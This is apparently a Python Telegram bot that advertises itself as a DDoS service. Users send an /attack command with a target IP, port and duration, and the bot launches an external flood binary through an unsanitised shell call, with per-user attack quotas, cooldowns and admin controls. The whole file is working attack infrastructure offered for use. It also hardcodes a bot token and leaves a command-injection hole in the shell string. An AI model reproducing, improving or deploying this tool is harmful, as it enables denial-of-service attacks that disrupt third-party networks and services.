#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import aiohttp
import threading
import random
# Insert your Telegram bot token here
bot = telebot.TeleBot('7330439352:AAGe4akhUf57yi6wNDRCl44IRoot4ehq3cc')


# Admin user IDs
admin_id = ["6005957043,7962308718"]

# Group and channel details
GROUP_ID = "--1002399798592"
CHANNEL_USERNAME = "@sharma"

# Default cooldown and attack limits
COOLDOWN_TIME = 80  # Cooldown in seconds
ATTACK_LIMIT = 10  # Max attacks per day

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}
global_last_attack_time = None  # Global cooldown tracker

# 🎯 Random Image URLs  
image_urls = [
    "https://envs.sh/g7a.jpg",
    "https://envs.sh/g7O.jpg",
    "https://envs.sh/g7_.jpg",
    "https://envs.sh/gHR.jpg",
    "https://envs.sh/gH4.jpg",
    "https://envs.sh/gHU.jpg",
    "https://envs.sh/gHl.jpg",
    "https://envs.sh/gH1.jpg",
    "https://envs.sh/gHk.jpg",
    "https://envs.sh/68x.jpg",
    "https://envs.sh/67E.jpg",
    "https://envs.sh/67Q.jpg",
    "https://envs.sh/686.jpg",
    "https://envs.sh/68V.jpg",
    "https://envs.sh/68-.jpg",
    "https://envs.sh/Vwn.jpg",
    "https://envs.sh/Vwe.jpg",
    "https://envs.sh/VwZ.jpg",
    "https://envs.sh/VwG.jpg",
    "https://envs.sh/VwK.jpg",
    "https://envs.sh/VwA.jpg",
    "https://envs.sh/Vw_.jpg",
    "https://envs.sh/Vwc.jpg"
]

def is_user_in_channel(user_id):
    return True  # **यहीं पर Telegram API से चेक कर सकते हो**
# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

# Function to save user data to the file
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

# Middleware to ensure users are joined to the channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

pending_feedback = {}  # यूजर की स्क्रीनशॉट वेटिंग स्टेट स्टोर करने के लिए

# Track the pending attack status globally
global_pending_attack = None  # This will store user_id of the ongoing attack

@bot.message_handler(commands=['attack'])
# Direct call instead of threading in attack finish
def handle_attack(message):
    global global_last_attack_time, global_pending_attack
    
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command = message.text.split()

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"𝐉𝐎𝐈𝐍 𝐊𝐑𝐎 𝐏𝐀𝐇𝐋𝐄 {CHANNEL_USERNAME}")
        return

    if global_pending_attack:
        bot.reply_to(message, "⚠️ **Wait for the ongoing attack to finish!**")
        return

    # Attack Logic
    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}
    
    user = user_data[user_id]
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, f"❌ You have reached your daily attack limit of {ATTACK_LIMIT}. Try again tomorrow.")
        return

    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]
    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "Error: PORT and TIME must be integers.")
        return

    full_command = f"./Rahul {target} {port} {time_duration} 900"
    
    # Attack Start Notification
    random_image = random.choice(image_urls)
    remaining_attacks = ATTACK_LIMIT - user['attacks'] - 1
    bot.send_photo(message.chat.id, random_image, 
                   caption=f"🚀 Attack started on `{target}:{port}`\n⏳ Remaining time: {time_duration}s\n⚡ Remaining Attacks: {remaining_attacks}")
    
    # Mark user as pending feedback
    pending_feedback[user_id] = True
    global_pending_attack = user_id  # Mark attack in progress

    try:
        subprocess.run(full_command, shell=True, check=True)
        # Attack finished notification
        send_attack_finished(message, user_name, target, port, time_duration, remaining_attacks)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ Error executing attack command: {e}")
        global_pending_attack = None  # Reset on error
        pending_feedback[user_id] = False  # Allow next attack if failed

def send_attack_finished(message, user_name, target, port, time_duration, remaining_attacks):
    global global_last_attack_time, global_pending_attack

    # Attack finished notification
    bot.send_message(message.chat.id, 
                     f"✅ Attack Finished ✅\n🚀 Attack on `{target}:{port}` completed.\n⏳ Duration: {time_duration}s\n⚡ Remaining Attacks: {remaining_attacks}")

    # Cooldown start
    global_last_attack_time = datetime.datetime.now()
    cooldown_end_time = global_last_attack_time + datetime.timedelta(seconds=COOLDOWN_TIME)
    
    # Send initial cooldown message
    cooldown_msg = bot.send_message(message.chat.id, f"⏳ Cooldown started... {COOLDOWN_TIME}s remaining")

    # Cooldown loop
    while datetime.datetime.now() < cooldown_end_time:
        remaining_cooldown = (cooldown_end_time - datetime.datetime.now()).seconds
        try:
            bot.edit_message_text(chat_id=message.chat.id, 
                                  message_id=cooldown_msg.message_id,
                                  text=f"⏳ Cooldown: {remaining_cooldown}s remaining")
        except Exception as e:
            print(f"Error updating cooldown message: {e}")
        time.sleep(1)

    # Notify cooldown over
    bot.send_message(message.chat.id, "🚀 **Cooldown Over! You can attack again!**")
    global_pending_attack = None  # Reset pending attack flag
@bot.message_handler(commands=['check_cooldown'])
def check_cooldown(message):
    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
        bot.reply_to(message, f"Global cooldown: {remaining_time} seconds remaining.")
    else:
        bot.reply_to(message, "No global cooldown. You can initiate an attack.")

# Command to check remaining attacks for a user
@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in user_data:
        bot.reply_to(message, f"You have {ATTACK_LIMIT} attacks remaining for today.")
    else:
        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
        bot.reply_to(message, f"You have {remaining_attacks} attacks remaining for today.")

# Admin commands
@bot.message_handler(commands=['reset'])
def reset_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /reset <user_id>")
        return

    user_id = command[1]
    if user_id in user_data:
        user_data[user_id]['attacks'] = 0
        save_users()
        bot.reply_to(message, f"Attack limit for user {user_id} has been reset.")
    else:
        bot.reply_to(message, f"No data found for user {user_id}.")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /setcooldown <seconds>")
        return

    global COOLDOWN_TIME
    try:
        COOLDOWN_TIME = int(command[1])
        bot.reply_to(message, f"Cooldown time has been set to {COOLDOWN_TIME} seconds.")
    except ValueError:
        bot.reply_to(message, "Please provide a valid number of seconds.")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    user_list = "\n".join([f"User ID: {user_id}, Attacks Used: {data['attacks']}, Remaining: {ATTACK_LIMIT - data['attacks']}" 
                           for user_id, data in user_data.items()])
    bot.reply_to(message, f"User Summary:\n\n{user_list}")
    
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "•❈•❉•❊•₪₪₪𝐃𝐇𝐀𝐍𝐘𝐖𝐀𝐀𝐃 𝐀𝐏𝐊𝐀 𝐉𝐎 𝐀𝐀𝐏𝐍𝐄 𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐃𝐈𝐘𝐀 𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐆𝐀 𝐒𝐊𝐓𝐄 𝐇𝐎  ₪₪₪•❃•❅•❆•")
        pending_feedback[user_id] = False  # Screenshot मिल गया, अब नया अटैक कर सकता है
    else:
        bot.reply_to(message, "❌ You are not required to submit a screenshot right now.")
        

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to Your Home, Feel Free to Explore.\nThe World's Best Ddos Bot\nTo Use This Bot Join https://t.me/+ZPo210hJV2YwZDhl"
    bot.reply_to(message, response)

# Function to reset daily limits automatically
def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

# Start auto-reset in a separate thread
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Load user data on startup
load_users()


#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(15)
        
        
     





